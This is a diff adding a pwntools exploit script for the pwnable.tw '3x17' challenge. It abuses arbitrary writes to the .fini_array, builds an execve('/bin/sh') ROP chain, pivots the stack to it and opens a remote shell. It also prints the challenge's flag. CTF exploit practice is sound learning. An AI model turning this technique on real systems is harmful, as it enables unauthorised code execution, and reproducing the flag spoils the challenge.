@@ -1,0 +1,82 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+
+exe = ELF("./3x17e")
+# context.log_level='debug'
+context.terminal = ["alacritty","-e"]
+p = remote("chall.pwnable.tw", 10105)
+# p = process([exe.path])
+def gdbs():
+    gdb.attach(p, gdbscript="""
+    # b*0x0000000000401BDC
+    # b*0x0000000000446E2C
+    #stack smashing
+    # b*0x44a42c
+    # b*0x000000000040FD30
+    # call 1
+    b*0x402988
+    # call 2 
+# b*0x40f918
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def writes(addr,data):
+    sla("addr:",str(addr))
+    sa("data:",data)
+# gdbs()
+write_addr = 0x4b40f8
+write_addr2 = 0x4b92c8
+pop_rax = 0x000000000041e4af
+pop_rsi_pop_rdx = 0x000000000044a309
+pop_rdi = 0x0000000000401696
+write_addr3 = 0x00000000004b40f0
+ret = 0x446e36
+test = 0x4b4000
+rop = 0x4b4100
+writes(write_addr3,p64(0x402961)+p64(0x000000000401B6D))
+leave_ret = 0x0000000000401c4b
+syscall = 0x00000000004022b4
+log.info(f"rop addr: {hex(rop)}")
+log.info(f"write addr: {hex(write_addr3)}")
+gad = []
+gad.append(pop_rax)
+gad.append(0x3b)
+gad.append(pop_rsi_pop_rdx)
+gad.append(0)
+gad.append(0)
+gad.append(pop_rdi)
+gad.append(test)
+gad.append(syscall)
+
+for i in range(len(gad)):
+    writes(rop+i*8,p64(gad[i]))
+writes(test,b"/bin/sh\0")
+# gdbs()
+writes(write_addr3,p64(leave_ret))
+#FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}
+
+#actually the the main check if the code is used again by adding and storing value, but when the loop is no end, it can be overflow and become the start
+# .text:0000000000401B8E                 mov     cs:byte_4B9330, al
+# .text:0000000000401B94                 movzx   eax, cs:byte_4B9330
+# .text:0000000000401B9B                 cmp     al, 1
+# .text:0000000000401B9D                 jnz     loc_401C35
+
+# sla("data:",b"fdjkfd")
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
